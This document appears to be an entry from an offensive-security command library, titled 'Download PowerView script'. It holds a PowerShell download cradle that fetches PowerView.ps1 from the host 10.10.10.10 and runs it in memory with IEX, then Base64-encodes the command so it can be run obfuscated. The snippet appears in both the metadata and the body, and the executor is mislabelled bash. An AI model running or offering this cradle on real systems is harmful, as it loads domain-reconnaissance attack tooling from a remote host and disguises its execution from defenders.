---
id: f97dc251-d2c0-42b0-80f5-4ec471641d4b
name: Download PowerView script
type: command
executor: bash
data: '$command = ''IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")''

  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

  $encodedCommand = [Convert]::ToBase64String($bytes)'
output: null
created_at: '2023-04-06T03:56:24.012025+00:00'
updated_at: '2023-04-10T20:37:01.833279+00:00'
---

# Download PowerView script

```bash
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```
